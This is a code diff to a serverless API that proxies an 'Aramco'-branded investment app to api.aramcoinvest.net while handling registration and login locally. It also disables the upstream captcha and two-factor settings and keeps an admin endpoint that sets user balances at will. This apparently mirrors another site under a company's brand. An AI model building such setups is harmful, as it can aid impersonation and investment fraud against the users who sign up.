@@ -1,14 +1,24 @@
 /**
- * API for the bundled SPA. Persists users + sessions + balances when Vercel Postgres is linked (POSTGRES_URL).
- * Memory fallback if POSTGRES_URL is unset (local dev without DB).
+ * API proxy for the bundled SPA.
+ *
+ * Strategy:
+ *   1. Auth endpoints (register, login) use our own Postgres-backed user system.
+ *   2. All other endpoints are proxied to the upstream API (api.aramcoinvest.net)
+ *      so that real data (products, images, tasks, etc.) flows through.
+ *   3. Upload/image requests are also proxied so images load correctly.
  *
  * Env:
  *   POSTGRES_URL       — auto-set when you add Vercel Postgres
  *   STUB_ADMIN_SECRET  — POST /api/admin/balance with header x-admin-secret
+ *   UPSTREAM_API       — upstream API base (default: https://api.aramcoinvest.net)
  */
 
+const https = require("https");
+const http = require("http");
 const bcrypt = require("bcryptjs");
 const db = require("../lib/db");
+
+const UPSTREAM = (process.env.UPSTREAM_API || "https://api.aramcoinvest.net").replace(/\/+$/, "");
 
 function applyCors(req, res) {
   const origin =
@@ -55,6 +65,15 @@ function parseBody(req) {
         reject(e);
       }
     });
+    req.on("error", reject);
+  });
+}
+
+function collectRawBody(req) {
+  return new Promise((resolve, reject) => {
+    const chunks = [];
+    req.on("data", (c) => chunks.push(c));
+    req.on("end", () => resolve(Buffer.concat(chunks)));
     req.on("error", reject);
   });
 }
@@ -116,64 +135,6 @@ function userRow(u) {
   };
 }
 
-function appInfoData() {
-  return {
-    site_info: {
-      site_name: "Aramco",
-      site_domain_type: "2",
-      site_domain_prefix: "www",
-      logo: "",
-      ico: "",
-    },
-    setting: {
-      index_is_login: "false",
-      user_invite_link: "",
-      index_force_notice: "false",
-      is_enable_sign: "false",
-      is_enable_lottery: "false",
-      is_show_fake_data: "false",
-      register_is_captcha: "false",
-      tg_status: "",
-      telegram_register_status: "",
-      salesmartly_src: "",
-    },
-    register_info: {
-      invitation_code_require: "false",
-      is_repeat_password: "true",
-      register_account_status: "true",
-      tg_status: "",
-      ws_app_status: "",
-      register_is_captcha: "false",
-      phone_register_email_status: "true",
-    },
-    theme: 1,
-  };
-}
-
-function indexInfoData() {
-  return ok({
-    notice: [],
-    slide: [],
-    sys_info: {
-      salesmartly_src: "",
-      index_video_is_show: "false",
-      index_video_url: "",
-      buy_product_is_pwd: "false",
-      invest_show_type: "",
-      is_show_fake_data: "false",
-      index_force_notice: "false",
-      is_enable_sign: "false",
-      is_enable_lottery: "false",
-      lottery_type: "",
-    },
-    index: {
-      user: null,
-      new_message_count: 0,
-      new_pop_message_count: 0,
-    },
-  }).data;
-}
-
 async function issueToken(email) {
   const token = "tk_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
   const exp = Math.floor(Date.now() / 1000) + 86400 * 7;
@@ -183,6 +144,140 @@ async function issueToken(email) {
     tokenToEmail.set(token, email);
   }
   return { token, expires_time: exp };
+}
+
+/**
+ * Proxy a request to the upstream API server.
+ * Forwards the original method, headers (minus host), and body.
+ * Streams the upstream response back to the client.
+ */
+function proxyToUpstream(req, res, route, rawBody) {
+  return new Promise((resolve, reject) => {
+    const url = new URL(UPSTREAM + "/api" + route);
+
+    // Preserve query string from original request
+    const origUrl = req.url || "";
+    const qIdx = origUrl.indexOf("?");
+    if (qIdx !== -1) {
+      const origParams = new URLSearchParams(origUrl.slice(qIdx + 1));
+      // Remove internal 'path' param used by Vercel routing
+      origParams.delete("path");
+      for (const [k, v] of origParams) {
+        url.searchParams.append(k, v);
+      }
+    }
+
+    const headers = {};
+    // Forward select headers
+    const forwardHeaders = [
+      "content-type",
+      "authorization",
+      "accept",
+      "accept-language",
+      "st-lang",
+      "st-ctime",
+      "st-ttgn",
+    ];
+    for (const h of forwardHeaders) {
+      if (req.headers[h]) headers[h] = req.headers[h];
+    }
+
+    const mod = url.protocol === "https:" ? https : http;
+    const proxyReq = mod.request(
+      url,
+      {
+        method: req.method,
+        headers,
+        timeout: 15000,
+      },
+      (proxyRes) => {
+        applyCors(req, res);
+        // Forward content-type and other response headers
+        const ct = proxyRes.headers["content-type"];
+        if (ct) res.setHeader("Content-Type", ct);
+        res.statusCode = proxyRes.statusCode || 200;
+        proxyRes.pipe(res);
+        proxyRes.on("end", resolve);
+        proxyRes.on("error", (e) => {
+          if (!res.headersSent) {
+            json(req, res, 502, err("upstream stream error: " + e.message, 502));
+          } else {
+            res.destroy();
+          }
+          resolve();
+        });
+      }
+    );
+
+    proxyReq.on("error", (e) => {
+      json(req, res, 502, err("upstream error: " + e.message, 502));
+      resolve();
+    });
+
+    proxyReq.on("timeout", () => {
+      proxyReq.destroy();
+      json(req, res, 504, err("upstream timeout", 504));
+      resolve();
+    });
+
+    if (rawBody && rawBody.length > 0) {
+      proxyReq.setHeader("Content-Length", rawBody.length);
+      proxyReq.write(rawBody);
+    }
+    proxyReq.end();
+  });
+}
+
+/**
+ * Proxy upload/image requests to upstream.
+ * Handles paths like /upload/img/xxx.webp, /upload/files/xxx.jpg
+ */
+function proxyUpload(req, res, uploadPath) {
+  return new Promise((resolve, reject) => {
+    const url = new URL(UPSTREAM + "/" + uploadPath);
+    const mod = url.protocol === "https:" ? https : http;
+
+    const proxyReq = mod.request(
+      url,
+      { method: "GET", timeout: 15000 },
+      (proxyRes) => {
+        applyCors(req, res);
+        const ct = proxyRes.headers["content-type"];
+        if (ct) res.setHeader("Content-Type", ct);
+        const cl = proxyRes.headers["content-length"];
+        if (cl) res.setHeader("Content-Length", cl);
+        const cc = proxyRes.headers["cache-control"];
+        res.setHeader("Cache-Control", cc || "public, max-age=86400, immutable");
+        res.statusCode = proxyRes.statusCode || 200;
+        proxyRes.pipe(res);
+        proxyRes.on("end", resolve);
+        proxyRes.on("error", (e) => {
+          if (!res.headersSent) {
+            res.statusCode = 502;
+            res.end("upstream stream error");
+          } else {
+            res.destroy();
+          }
+          resolve();
+        });
+      }
+    );
+
+    proxyReq.on("error", (e) => {
+      res.statusCode = 502;
+      res.end("upstream error");
+      resolve();
+    });
+
+    proxyReq.on("timeout", () => {
+      proxyReq.destroy();
+      res.statusCode = 504;
+      res.end("upstream timeout");
+      resolve();
+    });
+
+    proxyReq.end();
+  });
 }
 
 module.exports = async (req, res) => {
@@ -198,17 +293,34 @@ module.exports = async (req, res) => {
   if (!Array.isArray(parts)) parts = [parts];
   const route = "/" + parts.join("/");
 
+  // Collect raw body early so we can forward it if proxying
+  const rawBody = req.method !== "GET" && req.method !== "HEAD"
+    ? await collectRawBody(req)
+    : null;
+
+  // Helper to parse JSON from raw body
+  function parsedBody() {
+    if (!rawBody || rawBody.length === 0) return {};
+    try { return JSON.parse(rawBody.toString()); } catch (e) { return {}; }
+  }
+
   try {
     if (db.usePostgres()) {
       await db.ensureSchema();
     }
 
+    // --- Upload/image proxy (paths like upload/img/..., upload/files/...) ---
+    if (route.startsWith("/upload/")) {
+      return proxyUpload(req, res, route.slice(1));
+    }
+
+    // --- Admin endpoints (local only) ---
     if (route === "/admin/balance" && req.method === "POST") {
       const secret = process.env.STUB_ADMIN_SECRET;
       if (!secret || req.headers["x-admin-secret"] !== secret) {
         return json(req, res, 403, err("Forbidden", 403));
       }
-      const b = await parseBody(req);
+      const b = parsedBody();
       const email = String(b.email || "").toLowerCase();
       const amount = String(b.balance != null ? b.balance : "0");
       if (!email) return json(req, res, 400, err("email required"));
@@ -224,33 +336,9 @@ module.exports = async (req, res) => {
       return json(req, res, 200, ok({ updated: true, email, balance: amount }));
     }
 
-    if (route === "/public/index_info" && req.method === "GET") {
-      const inner = indexInfoData();
-      return json(req, res, 200, { status: 200, msg: "ok", data: inner });
-    }
-
-    if (route === "/public/get_lang_json" && req.method === "GET") {
-      return json(req, res, 200, ok({ en: {}, zh: {} }));
-    }
-
-    if (route === "/public/reset" && req.method === "GET") {
-      return json(req, res, 200, ok({}));
-    }
-
-    if (route.startsWith("/public/") && req.method === "GET") {
-      return json(req, res, 200, ok([]));
-    }
-
-    if (route === "/user/login_info" && req.method === "POST") {
-      return json(req, res, 200, ok(appInfoData()));
-    }
-
-    if (route === "/user/app_info" && req.method === "GET") {
-      return json(req, res, 200, ok(appInfoData()));
-    }
-
+    // --- Auth endpoints (local user system) ---
     if (route.startsWith("/user/register") && req.method === "POST") {
-      const b = await parseBody(req);
+      const b = parsedBody();
       const email = String(b.email || b.account || "").toLowerCase();
       const password = String(b.password || "demo123");
       if (!email) return json(req, res, 200, err("email required", 400003));
@@ -281,8 +369,8 @@ module.exports = async (req, res) => {
       return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
     }
 
-    if (route.startsWith("/user/login") && req.method === "POST") {
-      const b = await parseBody(req);
+    if (route.startsWith("/user/login") && !route.includes("login_info") && !route.includes("login_verify") && req.method === "POST") {
+      const b = parsedBody();
       const email = String(b.email || b.account || "").toLowerCase();
       const password = String(b.password || "");
       if (!email) return json(req, res, 200, err("invalid", 401));
@@ -319,6 +407,69 @@ module.exports = async (req, res) => {
       return json(req, res, 200, ok({ token, expires_time, user: userRow(u) }));
     }
 
+    // --- App/login config (local, not proxied) ---
+    // These must be handled locally so captcha/registration settings
+    // stay compatible with our own auth system.
+    if ((route === "/user/login_info" && req.method === "POST") ||
+        (route === "/user/app_info" && req.method === "GET")) {
+      // Fetch upstream config and override auth-related fields
+      return new Promise((resolve) => {
+        const url = new URL(UPSTREAM + "/api" + route);
+        const mod = url.protocol === "https:" ? https : http;
+        const proxyReq = mod.request(url, { method: "GET", timeout: 8000 }, (proxyRes) => {
+          let body = "";
+          proxyRes.on("data", (c) => (body += c));
+          proxyRes.on("end", () => {
+            try {
+              const upstream = JSON.parse(body);
+              const d = upstream.data || {};
+              // Override registration/captcha settings for our local auth
+              if (d.register_info) {
+                d.register_info.register_is_captcha = "false";
+                d.register_info.invitation_code_require = "false";
+              }
+              if (d.setting) {
+                d.setting.register_is_captcha = "false";
+                d.setting.google_secret_status = "false";
+              }
+              json(req, res, 200, upstream);
+            } catch (e) {
+              // Fallback: return minimal local config
+              json(req, res, 200, ok({
+                register_info: {
+                  register_is_captcha: "false",
+                  invitation_code_require: "false",
+                  is_repeat_password: "true",
+                  register_account_status: "true",
+                },
+                setting: {
+                  register_is_captcha: "false",
+                  index_is_login: "false",
+                  pwa_app_name: "Aramco",
+                },
+                theme: 1,
+              }));
+            }
+            resolve();
+          });
+          proxyRes.on("error", () => {
+            json(req, res, 200, ok({ register_info: { register_is_captcha: "false" }, setting: {}, theme: 1 }));
+            resolve();
+          });
+        });
+        proxyReq.on("error", () => {
+          json(req, res, 200, ok({ register_info: { register_is_captcha: "false" }, setting: {}, theme: 1 }));
+          resolve();
+        });
+        proxyReq.on("timeout", () => {
+          proxyReq.destroy();
+          json(req, res, 200, ok({ register_info: { register_is_captcha: "false" }, setting: {}, theme: 1 }));
+          resolve();
+        });
+        proxyReq.end();
+      });
+    }
+
     if (route === "/user/login_verify" && req.method === "GET") {
       applyCors(req, res);
       res.setHeader("Content-Type", "image/png");
@@ -330,48 +481,18 @@ module.exports = async (req, res) => {
       return res.end(png);
     }
 
+    // --- User info endpoints (local user data) ---
     const email = await sessionEmail(req);
-    if (
-      [
-        "/user/user_info",
-        "/user/mine",
-        "/user/invite_info",
-        "/user/share_config",
-        "/user/get_share_task",
-        "/user/invite_give",
-        "/user/team_recharge",
-        "/user/task_center",
-        "/user/task_center_detail",
-        "/user/vip_level_record",
-        "/user/user_rank",
-      ].includes(route) &&
-      req.method === "GET"
-    ) {
+    if ((route === "/user/user_info" || route === "/user/mine") && req.method === "GET") {
       if (!email) return json(req, res, 200, err("unauthorized", 401));
       const u = await loadUser(email);
       if (!u) return json(req, res, 200, err("unauthorized", 401));
-      if (route === "/user/mine" || route === "/user/user_info") {
-        return json(req, res, 200, ok(userRow(u)));
-      }
-      return json(req, res, 200, ok({ list: [], rows: [], user: userRow(u) }));
+      return json(req, res, 200, ok(userRow(u)));
     }
 
-    if (route.startsWith("/task/") && req.method === "GET") {
-      return json(req, res, 200, ok({ list: [], count: 0, info: {} }));
-    }
+    // --- Everything else: proxy to upstream ---
+    return proxyToUpstream(req, res, route, rawBody);
 
-    if (route.startsWith("/task/") && req.method === "POST") {
-      return json(req, res, 200, ok({}));
-    }
-
-    if (route.startsWith("/user/") && (req.method === "GET" || req.method === "POST")) {
-      if (!route.includes("login") && !route.includes("register") && !email) {
-        return json(req, res, 200, err("unauthorized", 401));
-      }
-      return json(req, res, 200, ok({}));
-    }
-
-    return json(req, res, 200, ok({}));
   } catch (e) {
     return json(req, res, 500, err(e.message || "error", 500));
   }
